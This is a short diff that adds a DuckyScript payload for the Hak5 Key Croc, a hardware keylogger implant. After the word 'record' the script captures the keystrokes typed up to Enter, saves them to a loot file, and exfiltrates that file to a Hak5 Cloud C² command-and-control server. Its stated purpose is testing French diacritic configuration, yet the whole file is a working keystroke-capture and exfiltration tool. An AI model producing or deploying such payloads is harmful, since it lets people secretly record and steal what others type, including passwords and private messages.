@@ -1,0 +1,22 @@
+REM Title:       Simple recorder
+REM Author:      Édouard Dupont
+REM Description: Record keys after the "record" or "Record" keyword.
+REM              Useful to verify diacritic characters configuration.
+REM Category:    General
+REM Device:      Key Croc
+REM Target:      *
+REM Version:     1.0
+REM License:     GNU General Public License v3.0
+REM Require:     Hak5 Cloud C² server
+REM Source:      https://github.com/th3m1s-42/Ducky-Scripts/
+
+
+DUCKY_LANG fr 
+
+MATCH [rR]ecord
+SAVEKEYS /root/loot/record-test.txt UNTIL \[ENTER\]
+
+WAIT_FOR_LOOT /root/loot/record-test.txt
+
+C2EXFIL STRING /root/loot/record-test.txt
+C2NOTIFY INFO 'Recorded keys'
